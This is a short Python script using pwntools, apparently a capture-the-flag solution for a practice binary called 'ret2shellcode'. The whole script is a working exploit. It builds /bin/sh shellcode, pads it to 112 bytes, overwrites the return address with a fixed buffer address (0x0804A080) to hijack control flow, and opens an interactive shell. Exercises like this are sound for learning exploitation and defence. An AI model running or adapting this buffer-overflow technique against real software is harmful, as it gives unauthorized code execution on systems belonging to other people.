from pwn import *
sh = process("./ret2shellcode")
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804A080
payload = shellcode.ljust(112, b'a') + p32(buf2_addr)

sh.sendline(payload)
sh.interactive()